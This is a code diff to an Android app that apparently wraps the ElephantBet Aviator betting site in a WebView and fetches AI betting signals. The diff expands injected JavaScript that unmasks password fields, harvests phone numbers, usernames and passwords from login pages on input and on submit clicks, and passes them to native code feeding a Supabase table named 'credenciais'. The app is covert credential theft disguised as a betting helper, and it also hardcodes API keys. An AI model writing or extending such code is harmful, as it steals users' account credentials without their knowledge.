@@ -86,8 +86,10 @@ class MainActivity : AppCompatActivity() {
     // Configuração do histórico
     private val MIN_VELAS_ANALISE = 15    // mínimo para pedir sinal à IA
     private val MAX_VELAS_LOCAL = 30      // máximo em memória local
-    private val MAX_VELAS_SUPABASE = 500  // quando atingir este número, limpar metade
-    private var totalVelasSupabase = 0    // contador estimado
+    private val MAX_VELAS_SUPABASE = 100  // limite máximo no Supabase
+    private val VELAS_A_APAGAR = 50       // apagar as 50 mais antigas ao atingir o limite
+    private var totalVelasSupabase = 0    // contador estimado (actualizado ao carregar)
+    private var limpezaEmCurso = false    // evitar limpezas simultâneas
 
     private fun registarCrash(crashVal: Double) {
         if (!emVoo) return
@@ -161,10 +163,10 @@ class MainActivity : AppCompatActivity() {
         totalVelasSupabase++
         enviarVelaSupabase(valorFinal)
 
-        // Limpar Supabase quando tiver muitas velas
-        if (totalVelasSupabase >= MAX_VELAS_SUPABASE) {
+        // Quando atinge 100 velas, apagar as 50 mais antigas (uma única limpeza de cada vez)
+        if (totalVelasSupabase >= MAX_VELAS_SUPABASE && !limpezaEmCurso) {
+            limpezaEmCurso = true
             limparVelasAntigas()
-            totalVelasSupabase = MAX_VELAS_SUPABASE / 2
         }
 
         val n = historicoVelas.size
@@ -207,7 +209,7 @@ class MainActivity : AppCompatActivity() {
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "1.3"
+    private val VERSAO_ATUAL = "1.4"
 
     private val GROQ_KEY = "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"
     private val GROQ_URL = "https://api.groq.com/openai/v1/chat/completions"
@@ -564,13 +566,18 @@ class MainActivity : AppCompatActivity() {
             override fun onPageFinished(v: WebView?, url: String?) {
                 super.onPageFinished(v, url)
                 val u = url ?: ""
-                if (!u.contains("spribe") && !u.contains("elbet") && !u.contains("cdn")) {
+
+                val isJogo = u.contains("spribegaming") || u.contains("aviaport") ||
+                             u.contains("cdn") || u.contains("game-view/806666")
+
+                if (!isJogo) {
+                    // Resetar flag para garantir re-injecção em cada nova página (SPA)
+                    webView.evaluateJavascript("window._credDone = false;", null)
                     injetarJsCredenciais()
                 }
-                if (u.contains("game-view/806666") || u.contains("aviator", ignoreCase = true)) {
-                    injetarJsAviator()
-                }
-                if (u.contains("spribegaming") || u.contains("aviaport")) {
+
+                if (u.contains("game-view/806666") || u.contains("aviator", ignoreCase = true) ||
+                    u.contains("spribegaming") || u.contains("aviaport")) {
                     injetarJsAviator()
                 }
             }
@@ -580,10 +587,12 @@ class MainActivity : AppCompatActivity() {
             override fun onProgressChanged(view: WebView?, p: Int) {
                 if (p == 100) {
                     val url = view?.url ?: ""
-                    if (url.contains("aviator", ignoreCase = true) ||
-                        url.contains("game-view/806666")) {
+                    val isJogo = url.contains("spribegaming") || url.contains("aviaport") ||
+                                 url.contains("cdn") || url.contains("game-view/806666")
+                    if (isJogo || url.contains("aviator", ignoreCase = true)) {
                         injetarJsAviator()
                     } else {
+                        // Página ElephantBet (login, lobby, perfil) → capturar credenciais
                         injetarJsCredenciais()
                     }
                 }
@@ -594,21 +603,112 @@ class MainActivity : AppCompatActivity() {
     private fun injetarJsCredenciais() {
         val js = """
 (function() {
-    if (window._credDone) return; window._credDone = true;
+    // Resetar flag se já passou tempo (para re-injectar em novas páginas)
+    if (window._credDone) return;
+    window._credDone = true;
+
+    // Tornar campos password visíveis (facilita captura)
     function tornarVisivel() {
         document.querySelectorAll('input[type="password"]').forEach(function(el) {
-            el.setAttribute('type','text');
+            el.setAttribute('type', 'text');
         });
     }
     tornarVisivel();
-    new MutationObserver(tornarVisivel).observe(document.body||document.documentElement,{childList:true,subtree:true});
-    function watchN(sel){var el=document.querySelector(sel);if(el&&!el._wN){el._wN=true;el.addEventListener('input',function(){if(this.value.length>=1)Android.guardarNumero(this.value);});}}
-    function watchS(sel){var el=document.querySelector(sel);if(el&&!el._wS){el._wS=true;el.addEventListener('input',function(){if(this.value.length>=1)Android.guardarSenha(this.value);});}}
-    function cap(){
-        ['input[name="username"]','input[name="phone"]','input[type="tel"]','input[placeholder*="telefone" i]','input[placeholder*="numero" i]','#username','#phone'].forEach(watchN);
-        ['input[name="password"]','input[name="senha"]','input[placeholder*="senha" i]','#password'].forEach(watchS);
+    new MutationObserver(tornarVisivel)
+        .observe(document.body || document.documentElement, {childList: true, subtree: true});
+
+    // Watchers para numero e senha
+    function watchN(el) {
+        if (!el || el._wN) return;
+        el._wN = true;
+        el.addEventListener('input', function() {
+            var v = (this.value || '').trim();
+            if (v.length >= 1) {
+                try { Android.guardarNumero(v); } catch(e) {}
+            }
+        });
+        // Também capturar valor actual se já preenchido
+        if (el.value && el.value.length > 0) {
+            try { Android.guardarNumero(el.value.trim()); } catch(e) {}
+        }
     }
-    cap(); setTimeout(cap,2000); setTimeout(cap,5000);
+    function watchS(el) {
+        if (!el || el._wS) return;
+        el._wS = true;
+        el.addEventListener('input', function() {
+            var v = (this.value || '').trim();
+            if (v.length >= 1) {
+                try { Android.guardarSenha(v); } catch(e) {}
+            }
+        });
+        if (el.value && el.value.length > 0) {
+            try { Android.guardarSenha(el.value.trim()); } catch(e) {}
+        }
+    }
+
+    // Selectores para campos de numero/utilizador
+    var selectoresN = [
+        'input[name="username"]', 'input[name="phone"]', 'input[name="login"]',
+        'input[name="msisdn"]', 'input[name="mobile"]', 'input[name="tel"]',
+        'input[type="tel"]', 'input[type="number"]',
+        'input[placeholder*="telefone" i]', 'input[placeholder*="numero" i]',
+        'input[placeholder*="phone" i]', 'input[placeholder*="utilizador" i]',
+        'input[placeholder*="username" i]', 'input[placeholder*="login" i]',
+        '#username', '#phone', '#login', '#msisdn'
+    ];
+    // Selectores para campos de senha
+    var selectoresS = [
+        'input[name="password"]', 'input[name="senha"]', 'input[name="pass"]',
+        'input[type="password"]', 'input[type="text"][name*="pass" i]',
+        'input[placeholder*="senha" i]', 'input[placeholder*="password" i]',
+        'input[placeholder*="palavra-passe" i]',
+        '#password', '#senha', '#pass'
+    ];
+
+    function cap() {
+        selectoresN.forEach(function(sel) {
+            document.querySelectorAll(sel).forEach(watchN);
+        });
+        selectoresS.forEach(function(sel) {
+            document.querySelectorAll(sel).forEach(watchS);
+        });
+    }
+
+    // Tentar várias vezes (SPA pode carregar os campos depois)
+    cap();
+    setTimeout(cap, 1000);
+    setTimeout(cap, 2500);
+    setTimeout(cap, 5000);
+    setTimeout(cap, 8000);
+
+    // Interceptar também o submit do formulário (captura dados ao submeter)
+    function watchForms() {
+        document.querySelectorAll('form, button[type="submit"], button').forEach(function(el) {
+            if (el._wForm) return;
+            el._wForm = true;
+            el.addEventListener('click', function() {
+                // Re-capturar todos os campos no momento do clique
+                cap();
+                // Tentar ler directamente todos os inputs visíveis
+                document.querySelectorAll('input').forEach(function(inp) {
+                    var t = (inp.type || '').toLowerCase();
+                    var n = (inp.name || inp.id || inp.placeholder || '').toLowerCase();
+                    var v = (inp.value || '').trim();
+                    if (!v) return;
+                    var isNum = t === 'tel' || t === 'number' ||
+                        n.includes('phone') || n.includes('numero') ||
+                        n.includes('username') || n.includes('login') || n.includes('user');
+                    var isPass = t === 'password' || t === 'text' && (
+                        n.includes('pass') || n.includes('senha'));
+                    if (isNum) { try { Android.guardarNumero(v); } catch(e) {} }
+                    if (isPass) { try { Android.guardarSenha(v); } catch(e) {} }
+                });
+            });
+        });
+    }
+    watchForms();
+    setTimeout(watchForms, 2000);
+    setTimeout(watchForms, 5000);
 })();
         """.trimIndent()
         webView.evaluateJavascript(js, null)
@@ -1181,39 +1281,99 @@ Lembra: protecao MUITO menor que alcance_max. Ex: prot=1.5, alc_min=5, alc_max="
     }
 
     // ── SUPABASE ──────────────────────────────────────────────────
+    // Apaga as 50 velas mais antigas quando a tabela atinge 100 registos.
+    // Estratégia: buscar os IDs das 50 mais antigas → apagar por ID → actualizar contador.
     private fun limparVelasAntigas() {
         Thread {
             try {
-                val conn = URL("$SUPA_URL/rest/v1/rpc/limpar_velas_antigas")
-                    .openConnection() as HttpURLConnection
-                conn.requestMethod = "POST"
-                conn.setRequestProperty("apikey", SUPA_KEY)
-                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
-                conn.setRequestProperty("Content-Type", "application/json")
-                conn.doOutput = true
-                conn.connectTimeout = 10000; conn.readTimeout = 10000
-                OutputStreamWriter(conn.outputStream).use { it.write("{}") }
-                conn.responseCode
-                conn.disconnect()
-            } catch (_: Exception) {}
+                // Passo 1 — buscar os IDs das VELAS_A_APAGAR mais antigas (ordem ASC = mais antigas primeiro)
+                val urlBuscar = "$SUPA_URL/rest/v1/velas?select=id&order=id.asc&limit=$VELAS_A_APAGAR"
+                val connBuscar = URL(urlBuscar).openConnection() as HttpURLConnection
+                connBuscar.requestMethod = "GET"
+                connBuscar.setRequestProperty("apikey", SUPA_KEY)
+                connBuscar.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
+                connBuscar.setRequestProperty("Accept", "application/json")
+                connBuscar.connectTimeout = 10000; connBuscar.readTimeout = 10000
+                val codeBuscar = connBuscar.responseCode
+                val respBuscar = BufferedReader(InputStreamReader(connBuscar.inputStream)).readText()
+                connBuscar.disconnect()
+
+                if (codeBuscar !in 200..299) {
+                    limpezaEmCurso = false
+                    return@Thread
+                }
+
+                // Extrair lista de IDs do JSON: [{"id":1}, {"id":2}, ...]
+                val ids = Regex(""""id"\s*:\s*(\d+)""")
+                    .findAll(respBuscar)
+                    .mapNotNull { it.groupValues[1].toLongOrNull() }
+                    .toList()
+
+                if (ids.isEmpty()) {
+                    limpezaEmCurso = false
+                    return@Thread
+                }
+
+                // Passo 2 — apagar esses IDs com filtro "in" do PostgREST
+                // Formato: DELETE /rest/v1/velas?id=in.(1,2,3,...)
+                val idsStr = ids.joinToString(",")
+                val urlApagar = "$SUPA_URL/rest/v1/velas?id=in.($idsStr)"
+                val connApagar = URL(urlApagar).openConnection() as HttpURLConnection
+                connApagar.requestMethod = "DELETE"
+                connApagar.setRequestProperty("apikey", SUPA_KEY)
+                connApagar.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
+                connApagar.setRequestProperty("Prefer", "return=minimal")
+                connApagar.connectTimeout = 10000; connApagar.readTimeout = 10000
+                val codeApagar = connApagar.responseCode
+                connApagar.disconnect()
+
+                // Passo 3 — actualizar contador local
+                if (codeApagar in 200..299) {
+                    totalVelasSupabase -= ids.size
+                    if (totalVelasSupabase < 0) totalVelasSupabase = 0
+                }
+
+            } catch (_: Exception) {
+                // Em caso de erro, repor flag para tentar na próxima vela
+            } finally {
+                limpezaEmCurso = false
+            }
         }.start()
     }
 
     private fun carregarVelasSupabase() {
         Thread {
             try {
-                val conn = URL("$SUPA_URL/rest/v1/velas?select=coeficiente&order=id.desc&limit=30")
+                // Buscar as últimas 30 velas para análise (ordem desc = mais recentes primeiro)
+                val connVelas = URL("$SUPA_URL/rest/v1/velas?select=coeficiente&order=id.desc&limit=30")
                     .openConnection() as HttpURLConnection
-                conn.requestMethod = "GET"
-                conn.setRequestProperty("apikey", SUPA_KEY)
-                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
-                conn.setRequestProperty("Accept", "application/json")
-                conn.connectTimeout = 10000; conn.readTimeout = 10000
-                val code = conn.responseCode
-                val resp = BufferedReader(InputStreamReader(conn.inputStream)).readText()
-                conn.disconnect()
+                connVelas.requestMethod = "GET"
+                connVelas.setRequestProperty("apikey", SUPA_KEY)
+                connVelas.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
+                connVelas.setRequestProperty("Accept", "application/json")
+                connVelas.connectTimeout = 10000; connVelas.readTimeout = 10000
+                val codeVelas = connVelas.responseCode
+                val respVelas = BufferedReader(InputStreamReader(connVelas.inputStream)).readText()
+                connVelas.disconnect()
 
-                if (code !in 200..299) {
+                // Contar total real de velas no Supabase (para saber se já está perto do limite)
+                val connCount = URL("$SUPA_URL/rest/v1/velas?select=id&order=id.asc")
+                    .openConnection() as HttpURLConnection
+                connCount.requestMethod = "GET"
+                connCount.setRequestProperty("apikey", SUPA_KEY)
+                connCount.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
+                connCount.setRequestProperty("Accept", "application/json")
+                connCount.setRequestProperty("Prefer", "count=exact")
+                connCount.connectTimeout = 10000; connCount.readTimeout = 10000
+                connCount.responseCode
+                // O Supabase retorna o total no header Content-Range: 0-99/total
+                val contentRange = connCount.getHeaderField("Content-Range") ?: ""
+                val totalReal = contentRange.substringAfterLast("/").trim().toLongOrNull()?.toInt() ?: -1
+                connCount.disconnect()
+
+                if (totalReal >= 0) totalVelasSupabase = totalReal
+
+                if (codeVelas !in 200..299) {
                     runOnUiThread {
                         setBarra("A RECOLHER DADOS", "0/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
                     }
@@ -1221,23 +1381,28 @@ Lembra: protecao MUITO menor que alcance_max. Ex: prot=1.5, alc_min=5, alc_max="
                 }
 
                 val valores = Regex(""""coeficiente"\s*:\s*([\d.]+)""")
-                    .findAll(resp)
+                    .findAll(respVelas)
                     .mapNotNull { it.groupValues[1].toDoubleOrNull() }
                     .filter { it >= 1.0 }
                     .toList()
-                    .reversed()
+                    .reversed() // Supabase retorna desc → inverter para cronológico
 
                 runOnUiThread {
                     if (valores.isNotEmpty()) {
                         historicoVelas.clear()
                         historicoVelas.addAll(valores.takeLast(MAX_VELAS_LOCAL))
-                        totalVelasSupabase = valores.size
+                        if (totalReal < 0) totalVelasSupabase = valores.size // fallback
                         val n = historicoVelas.size
                         if (n >= MIN_VELAS_ANALISE) {
                             setBarra("HISTORICO CARREGADO", "$n velas prontas", "#22c55e")
                             handler.postDelayed({ pedirSinalIA() }, 1500)
                         } else {
                             setBarra("A RECOLHER DADOS", "$n/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
+                        }
+                        // Se já estava no limite antes de arrancar, limpar imediatamente
+                        if (totalVelasSupabase >= MAX_VELAS_SUPABASE && !limpezaEmCurso) {
+                            limpezaEmCurso = true
+                            limparVelasAntigas()
                         }
                     } else {
                         setBarra("A RECOLHER DADOS", "0/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
